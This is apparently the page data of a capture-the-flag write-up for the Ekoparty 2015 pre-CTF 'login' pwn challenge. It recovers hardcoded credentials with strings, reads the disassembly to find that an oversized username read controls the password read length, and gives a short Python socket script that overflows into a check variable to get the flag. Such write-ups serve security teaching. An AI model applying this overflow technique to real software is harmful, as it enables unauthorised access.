{"pageContext":{"html":"<p><a href=\"ctf=ekoparty-pre-ctf-2015\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=buffer-overflow\"></a></p>\n<p>We are given a <a href=\"/pwn50-852f17ecf0d0f660c27de3f97b4516a3.zip\">zip</a> file.\nExtracting it gives us <a href=\"/flag-c172aef33a3bc5ebd459e9f93900796c.\">flag</a> executable.</p>\n<pre><code class=\"language-bash\">$ file flag\nflag: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=36d90477a8214ae522b46125cf8296e52a3a2d6c, not stripped\n\n$ ./flag \nUser : AAAA\nPassword : AAAA\n</code></pre>\n<p>A quick strings on the file gives</p>\n<pre><code class=\"language-bash\">$ strings flag\n.\n.\nflag.txt\nUser : \nPassword : \ncharly\nh4ckTH1s\n.\n.\n\n$ ./flag \nUser : charly\nPassword : h4ckTH1s\nWelcome guest!\n</code></pre>\n<p>But no flag!!</p>\n<pre><code class=\"language-objdump\">   0x00000000004008d3 &#x3C;+310>:   lea    rax,[rbp-0xd0]\n   0x00000000004008da &#x3C;+317>:   add    rax,0x4\n   0x00000000004008de &#x3C;+321>:   mov    edx,0x6\n   0x00000000004008e3 &#x3C;+326>:   mov    esi,0x400a23\n   0x00000000004008e8 &#x3C;+331>:   mov    rdi,rax\n   0x00000000004008eb &#x3C;+334>:   call   0x400600 &#x3C;strncmp@plt>\n   0x00000000004008f0 &#x3C;+339>:   test   eax,eax\n   0x00000000004008f2 &#x3C;+341>:   jne    0x400945 &#x3C;main+424>\n   0x00000000004008f4 &#x3C;+343>:   lea    rax,[rbp-0xd0]\n   0x00000000004008fb &#x3C;+350>:   add    rax,0x18\n   0x00000000004008ff &#x3C;+354>:   mov    edx,0x8\n   0x0000000000400904 &#x3C;+359>:   mov    esi,0x400a2a\n   0x0000000000400909 &#x3C;+364>:   mov    rdi,rax\n   0x000000000040090c &#x3C;+367>:   call   0x400600 &#x3C;strncmp@plt>\n   0x0000000000400911 &#x3C;+372>:   test   eax,eax\n   0x0000000000400913 &#x3C;+374>:   jne    0x400945 &#x3C;main+424>\n   0x0000000000400915 &#x3C;+376>:   mov    edi,0x400a33\n   0x000000000040091a &#x3C;+381>:   call   0x400610 &#x3C;puts@plt>\n   0x000000000040091f &#x3C;+386>:   mov    eax,DWORD PTR [rbp-0xa8]\n   0x0000000000400925 &#x3C;+392>:   cmp    eax,0x1\n</code></pre>\n<p>We see there is an additional check involving $rbp-0xa8 to get the flag.</p>\n<pre><code class=\"language-objdump\">   0x000000000040083d &#x3C;+160>:   mov    DWORD PTR [rbp-0xd0],0x11\n   0x0000000000400847 &#x3C;+170>:   mov    DWORD PTR [rbp-0xbc],0x10\n   0x0000000000400851 &#x3C;+180>:   mov    DWORD PTR [rbp-0xa8],0x0\n   0x000000000040085b &#x3C;+190>:   mov    edi,0x400a0f\n   0x0000000000400860 &#x3C;+195>:   mov    eax,0x0\n   0x0000000000400865 &#x3C;+200>:   call   0x400640 &#x3C;printf@plt>\n   0x000000000040086a &#x3C;+205>:   mov    edi,0x0\n   0x000000000040086f &#x3C;+210>:   call   0x400690 &#x3C;fflush@plt>\n   0x0000000000400874 &#x3C;+215>:   mov    eax,DWORD PTR [rbp-0xd0]\n   0x000000000040087a &#x3C;+221>:   cdqe   \n   0x000000000040087c &#x3C;+223>:   lea    rdx,[rbp-0xd0]\n   0x0000000000400883 &#x3C;+230>:   lea    rcx,[rdx+0x4]\n   0x0000000000400887 &#x3C;+234>:   mov    rdx,rax\n   0x000000000040088a &#x3C;+237>:   mov    rsi,rcx\n   0x000000000040088d &#x3C;+240>:   mov    edi,0x0\n   0x0000000000400892 &#x3C;+245>:   call   0x400650 &#x3C;read@plt>\n   0x0000000000400897 &#x3C;+250>:   mov    edi,0x400a17\n   0x000000000040089c &#x3C;+255>:   mov    eax,0x0\n   0x00000000004008a1 &#x3C;+260>:   call   0x400640 &#x3C;printf@plt>\n   0x00000000004008a6 &#x3C;+265>:   mov    edi,0x0\n   0x00000000004008ab &#x3C;+270>:   call   0x400690 &#x3C;fflush@plt>\n   0x00000000004008b0 &#x3C;+275>:   mov    eax,DWORD PTR [rbp-0xbc]\n   0x00000000004008b6 &#x3C;+281>:   cdqe   \n   0x00000000004008b8 &#x3C;+283>:   lea    rdx,[rbp-0xd0]\n   0x00000000004008bf &#x3C;+290>:   lea    rcx,[rdx+0x18]\n   0x00000000004008c3 &#x3C;+294>:   mov    rdx,rax\n   0x00000000004008c6 &#x3C;+297>:   mov    rsi,rcx\n   0x00000000004008c9 &#x3C;+300>:   mov    edi,0x0\n   0x00000000004008ce &#x3C;+305>:   call   0x400650 &#x3C;read@plt>\n</code></pre>\n<p>The read for username is called with 0x11 length and password with 0x10.\nHowever when we give the username as 'A'*17 for second read</p>\n<pre><code class=\"language-bash\">Guessed arguments:\narg[0]: 0x0 \narg[1]: 0x7fffffffe158 --> 0x0 \narg[2]: 0x41 ('A')\narg[3]: 0x7fffffffe158 --> 0x0 \n</code></pre>\n<p>This means we can control the length of input for password using the input from username.\nAlso strncmp for username is called with 6 length and password with 8. This helps us so that we can pad the username and password with anything.\nAfter a little hit and trial we figure out the distance between password buffer and $rbp-0xa8 is 16</p>\n<pre><code class=\"language-python\">import socket\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('challs.ctf.site',20000))\ns.recv(1024)\ns.send('charlyAAAAAAAAAAA')\ns.recv(1024)\ns.send('h4ckTH1sAAAAAAAA\\x01\\x00')\nprint s.recv(1024)\n</code></pre>\n<p>gives us </p>\n<p>Welcome guest!\nYour flag is : EKO{Back<em>to</em>r00000ooooo00000tS}</p>\n<p>Flag</p>\n<blockquote>\n<p>EKO{Back<em>to</em>r00000ooooo00000tS}</p>\n</blockquote>","relativePath":"writeups/ekoparty-pre-ctf-2015/pwn/login/sudhackar"}}